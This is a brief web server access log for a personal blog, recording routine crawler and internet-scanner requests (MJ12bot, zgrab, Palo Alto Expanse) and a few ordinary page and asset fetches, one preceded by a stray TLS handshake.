220.196.160.144 - - [25/Jun/2024:04:53:48 +0800] "GET /myblog/category.html/1/3 HTTP/1.1" 200 21216 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
49.234.34.31 - - [25/Jun/2024:04:53:49 +0800] "GET /static/myblog/assets/vendor/glightbox/js/glightbox.min.js HTTP/1.1" 200 56300 "-" "Go-http-client/1.1"
49.234.34.31 - - [25/Jun/2024:04:53:49 +0800] "GET /static/myblog/assets/vendor/aos/aos.js HTTP/1.1" 200 13801 "-" "Go-http-client/1.1"
49.234.34.31 - - [25/Jun/2024:04:53:49 +0800] "GET /static/myblog/assets/vendor/php-email-form/validate.js HTTP/1.1" 200 2734 "-" "Go-http-client/1.1"
49.234.34.31 - - [25/Jun/2024:04:53:50 +0800] "GET /static/myblog/assets/js/aieditor.js%20 HTTP/1.1" 200 1516460 "-" "Go-http-client/1.1"
66.240.236.109 - - [25/Jun/2024:04:53:55 +0800] "GET / HTTP/1.1" 302 0 "-" "Mozilla/5.0 zgrab/0.x"
205.210.31.94 - - [25/Jun/2024:04:58:16 +0800] "GET / HTTP/1.0" 302 0 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
118.194.230.202 - - [25/Jun/2024:05:03:05 +0800] "\x16\x03\x01\x01.\x01\x00\x01*\x03\x03*4\xBAy\x8F5\xB5\x1F\xDC\x89\xD0;\xC51xr\x02\x8DC(\xAC\x06\x04\x93Nb\xF2v\xF9\xBBD\x1D M\xB0\xFEe\xACF\x15[t \x19\x0C\x1BA\xE4rM\xF1H\x9CMXOhS!q\x9C\xB5\xD76\xC5\x004\xCC\xA8\xCC\xA9\xC0/\xC00\xC0+\xC0,\xC0\x09\x00\x9E\xCC\xA8\xCC\xAA\x003\x00=\x00\x16\xC0" 400 157 "-" "-"
118.194.230.202 - - [25/Jun/2024:05:03:07 +0800] "GET / HTTP/1.1" 302 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
118.194.230.202 - - [25/Jun/2024:05:03:25 +0800] "GET /myblog/ HTTP/1.1" 200 45396 "http://chaofan.online/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
118.194.230.202 - - [25/Jun/2024:05:03:26 +0800] "GET /static/picture/icon.PNG HTTP/1.1" 200 56220 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
